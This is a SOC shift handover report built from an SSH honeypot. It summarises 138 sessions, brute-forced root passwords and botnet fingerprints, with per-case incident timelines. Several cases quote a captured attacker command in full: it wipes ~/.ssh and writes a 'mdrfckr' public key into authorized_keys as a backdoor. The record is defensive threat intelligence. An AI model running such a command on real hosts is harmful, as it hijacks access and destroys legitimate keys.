# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-23 |
| **Generated At** | 2026-04-23T09:48:57Z |
| **Shift Time** | 09:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **138** |
| Confirmed Threats | **108** |
| False Positives Filtered | **30** (21.7%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **12** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **120** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **66** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **28** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 18 |
| `345gs5662d34` | 8 |
| `GET / HTTP/1.1` | 6 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 4 |
| `Accept-Encoding: gzip` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `Accept: */*` | 5 |
| `Host: 13.235.92.17:23` | 4 |
| `` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `3245gs5662d34` | 8 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 4 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 4 |
| `Accept-Encoding: gzip` | `` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `zaq1@WSXcde3` | `178.17.49.86` | 2026-04-23T07:35:37 |
| `root` | `3245gs5662d34` | `178.17.49.86` | 2026-04-23T07:35:41 |
| `root` | `Aa123456789` | `172.200.228.35` | 2026-04-23T08:55:07 |
| `root` | `3245gs5662d34` | `172.200.228.35` | 2026-04-23T08:55:12 |
| `root` | `Zxcvbnm123` | `172.200.228.35` | 2026-04-23T09:01:29 |
| `root` | `zaq1@WSXcde3` | `172.200.228.35` | 2026-04-23T09:05:48 |
| `root` | `mas@2025` | `172.200.228.35` | 2026-04-23T09:06:53 |
| `root` | `Admin777` | `172.200.228.35` | 2026-04-23T09:07:59 |
| `root` | `sebas123` | `172.200.228.35` | 2026-04-23T09:11:07 |
| `root` | `Voda@123` | `172.200.228.35` | 2026-04-23T09:12:10 |
| `root` | `lvmf43BiqP` | `47.103.2.38` | 2026-04-23T09:38:17 |
| `root` | ` ` | `45.10.175.77` | 2026-04-23T09:44:22 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **138** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 56 |
| Nmap scanner | 16 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 54 | 3 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |
| `4e066189c3bb...` | Generic scanner | 2 | 2 |
| `19532158b559...` | Mirai/variant | 1 | 1 |
| `dde267e50f82...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 54 | 3 | libssh-based |
| `95420f9d932d...` | Nmap scanner | 9 | 4 | — |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `b4b8ae3d7241...` | libssh | 1 | 1 | Mirai/variant |
| `a20aced7c982...` | Nmap scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.200.228.35`, `178.17.49.86`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **16** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS51396` | Pfcloud UG | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS11259` | Angola Telecom | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b9c17f1d6db3

| Field | Detail |
|---|---|
| **Source IP** | `178.17.49[.]86` |
| **First Seen** | 2026-04-23 07:35 |
| **Last Seen** | 2026-04-23 07:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 07:35:37` | `cowrie.session.connect` |
| `2026-04-23 07:35:37` | `cowrie.client.version` |
| `2026-04-23 07:35:37` | `cowrie.client.kex` |
| `2026-04-23 07:35:37` | `cowrie.login.success` |
| `2026-04-23 07:35:38` | `cowrie.session.params` |
| `2026-04-23 07:35:38` | `cowrie.command.input` |
| `2026-04-23 07:35:38` | `cowrie.command.failed` |
| `2026-04-23 07:35:38` | `cowrie.log.closed` |
| `2026-04-23 07:35:38` | `cowrie.session.params` |
| `2026-04-23 07:35:38` | `cowrie.command.input` |
| `2026-04-23 07:35:38` | `cowrie.session.file_download` |
| `2026-04-23 07:35:38` | `cowrie.log.closed` |
| `2026-04-23 07:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.17.49[.]86` to AbuseIPDB if not already reported
- [ ] Block `178.17.49[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4b0f8e374f0

| Field | Detail |
|---|---|
| **Source IP** | `178.17.49[.]86` |
| **First Seen** | 2026-04-23 07:35 |
| **Last Seen** | 2026-04-23 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 07:35:40` | `cowrie.session.connect` |
| `2026-04-23 07:35:40` | `cowrie.client.version` |
| `2026-04-23 07:35:41` | `cowrie.client.kex` |
| `2026-04-23 07:35:41` | `cowrie.login.success` |
| `2026-04-23 07:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.17.49[.]86` to AbuseIPDB if not already reported
- [ ] Block `178.17.49[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3fa78d30ade

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 08:55 |
| **Last Seen** | 2026-04-23 08:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 08:55:05` | `cowrie.session.connect` |
| `2026-04-23 08:55:05` | `cowrie.client.version` |
| `2026-04-23 08:55:06` | `cowrie.client.kex` |
| `2026-04-23 08:55:07` | `cowrie.login.success` |
| `2026-04-23 08:55:07` | `cowrie.session.params` |
| `2026-04-23 08:55:07` | `cowrie.command.input` |
| `2026-04-23 08:55:07` | `cowrie.command.failed` |
| `2026-04-23 08:55:07` | `cowrie.log.closed` |
| `2026-04-23 08:55:08` | `cowrie.session.params` |
| `2026-04-23 08:55:08` | `cowrie.command.input` |
| `2026-04-23 08:55:08` | `cowrie.session.file_download` |
| `2026-04-23 08:55:08` | `cowrie.log.closed` |
| `2026-04-23 08:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2175ffb9b88

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 08:55 |
| **Last Seen** | 2026-04-23 08:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 08:55:11` | `cowrie.session.connect` |
| `2026-04-23 08:55:11` | `cowrie.client.version` |
| `2026-04-23 08:55:11` | `cowrie.client.kex` |
| `2026-04-23 08:55:12` | `cowrie.login.success` |
| `2026-04-23 08:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24aa51e3f9d3

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:01 |
| **Last Seen** | 2026-04-23 09:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:01:28` | `cowrie.session.connect` |
| `2026-04-23 09:01:28` | `cowrie.client.version` |
| `2026-04-23 09:01:28` | `cowrie.client.kex` |
| `2026-04-23 09:01:29` | `cowrie.login.success` |
| `2026-04-23 09:01:30` | `cowrie.session.params` |
| `2026-04-23 09:01:30` | `cowrie.command.input` |
| `2026-04-23 09:01:30` | `cowrie.command.failed` |
| `2026-04-23 09:01:30` | `cowrie.log.closed` |
| `2026-04-23 09:01:30` | `cowrie.session.params` |
| `2026-04-23 09:01:30` | `cowrie.command.input` |
| `2026-04-23 09:01:30` | `cowrie.session.file_download` |
| `2026-04-23 09:01:30` | `cowrie.log.closed` |
| `2026-04-23 09:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-697a486c82f9

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:01 |
| **Last Seen** | 2026-04-23 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:01:33` | `cowrie.session.connect` |
| `2026-04-23 09:01:33` | `cowrie.client.version` |
| `2026-04-23 09:01:33` | `cowrie.client.kex` |
| `2026-04-23 09:01:34` | `cowrie.login.success` |
| `2026-04-23 09:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ab6c469be7

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:05 |
| **Last Seen** | 2026-04-23 09:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:05:47` | `cowrie.session.connect` |
| `2026-04-23 09:05:47` | `cowrie.client.version` |
| `2026-04-23 09:05:47` | `cowrie.client.kex` |
| `2026-04-23 09:05:48` | `cowrie.login.success` |
| `2026-04-23 09:05:48` | `cowrie.session.params` |
| `2026-04-23 09:05:48` | `cowrie.command.input` |
| `2026-04-23 09:05:48` | `cowrie.command.failed` |
| `2026-04-23 09:05:49` | `cowrie.log.closed` |
| `2026-04-23 09:05:49` | `cowrie.session.params` |
| `2026-04-23 09:05:49` | `cowrie.command.input` |
| `2026-04-23 09:05:49` | `cowrie.session.file_download` |
| `2026-04-23 09:05:49` | `cowrie.log.closed` |
| `2026-04-23 09:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa639b7bc12

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:05 |
| **Last Seen** | 2026-04-23 09:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:05:52` | `cowrie.session.connect` |
| `2026-04-23 09:05:52` | `cowrie.client.version` |
| `2026-04-23 09:05:52` | `cowrie.client.kex` |
| `2026-04-23 09:05:53` | `cowrie.login.success` |
| `2026-04-23 09:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61d9ab499869

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:06 |
| **Last Seen** | 2026-04-23 09:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:06:52` | `cowrie.session.connect` |
| `2026-04-23 09:06:52` | `cowrie.client.version` |
| `2026-04-23 09:06:52` | `cowrie.client.kex` |
| `2026-04-23 09:06:53` | `cowrie.login.success` |
| `2026-04-23 09:06:53` | `cowrie.session.params` |
| `2026-04-23 09:06:53` | `cowrie.command.input` |
| `2026-04-23 09:06:53` | `cowrie.command.failed` |
| `2026-04-23 09:06:54` | `cowrie.log.closed` |
| `2026-04-23 09:06:54` | `cowrie.session.params` |
| `2026-04-23 09:06:54` | `cowrie.command.input` |
| `2026-04-23 09:06:54` | `cowrie.session.file_download` |
| `2026-04-23 09:06:54` | `cowrie.log.closed` |
| `2026-04-23 09:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5931b5c2b56

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:06 |
| **Last Seen** | 2026-04-23 09:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:06:57` | `cowrie.session.connect` |
| `2026-04-23 09:06:57` | `cowrie.client.version` |
| `2026-04-23 09:06:57` | `cowrie.client.kex` |
| `2026-04-23 09:06:58` | `cowrie.login.success` |
| `2026-04-23 09:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e85a01a826c0

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:07 |
| **Last Seen** | 2026-04-23 09:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:07:58` | `cowrie.session.connect` |
| `2026-04-23 09:07:58` | `cowrie.client.version` |
| `2026-04-23 09:07:58` | `cowrie.client.kex` |
| `2026-04-23 09:07:59` | `cowrie.login.success` |
| `2026-04-23 09:08:00` | `cowrie.session.params` |
| `2026-04-23 09:08:00` | `cowrie.command.input` |
| `2026-04-23 09:08:00` | `cowrie.command.failed` |
| `2026-04-23 09:08:00` | `cowrie.log.closed` |
| `2026-04-23 09:08:00` | `cowrie.session.params` |
| `2026-04-23 09:08:00` | `cowrie.command.input` |
| `2026-04-23 09:08:01` | `cowrie.session.file_download` |
| `2026-04-23 09:08:01` | `cowrie.log.closed` |
| `2026-04-23 09:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9821da1a596

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:08 |
| **Last Seen** | 2026-04-23 09:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:08:03` | `cowrie.session.connect` |
| `2026-04-23 09:08:03` | `cowrie.client.version` |
| `2026-04-23 09:08:04` | `cowrie.client.kex` |
| `2026-04-23 09:08:04` | `cowrie.login.success` |
| `2026-04-23 09:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.200.228[.]35` to AbuseIPDB if not already reported
- [ ] Block `172.200.228[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bad4de219455

| Field | Detail |
|---|---|
| **Source IP** | `172.200.228[.]35` |
| **First Seen** | 2026-04-23 09:11 |
| **Last Seen** | 2026-04-23 09:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 09:11:06` | `cowrie.session.connect` |
| `2026-04-23 09:11:06` | `cowrie.client.version` |
| `2026-04-23 09:11:06` | `cowrie.client.kex` |
| `2026-04-23 09:11:07` | `cowrie.login.success` |
